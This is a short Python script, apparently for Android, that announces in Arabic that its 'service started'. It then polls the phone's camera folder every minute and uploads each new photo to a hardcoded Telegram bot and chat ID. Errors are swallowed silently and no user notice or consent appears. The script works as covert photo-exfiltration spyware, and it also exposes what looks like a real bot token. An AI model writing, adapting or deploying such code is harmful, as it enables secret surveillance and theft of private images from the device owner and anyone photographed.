import os
import time
import requests

BOT_TOKEN = "8711969097:AAGCjUfiohcUHRWV_1UGa1j51GCEwmCtl3s"
CHAT_ID = "7084557369"

FOLDER = "/storage/emulated/0/DCIM/Camera"
sent = set()

def send_msg(text):
    try:
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            data={"chat_id": CHAT_ID, "text": text},
            timeout=10
        )
    except:
        pass

def send_file(path):
    try:
        with open(path, "rb") as f:
            r = requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
                data={"chat_id": CHAT_ID},
                files={"document": f},
                timeout=120
            )
        return r.status_code == 200
    except:
        return False

def scan():
    if not os.path.exists(FOLDER):
        return

    files = [
        os.path.join(FOLDER, f)
        for f in os.listdir(FOLDER)
        if f.lower().endswith((".jpg", ".jpeg", ".png"))
    ]

    files.sort(key=os.path.getmtime)

    for path in files:
        if path in sent:
            continue

        if send_file(path):
            sent.add(path)
            time.sleep(5)

def main():
    time.sleep(10)
    send_msg("🚀 الخدمة اشتغلت")

    while True:
        scan()
        time.sleep(60)

if __name__ == "__main__":
    main()
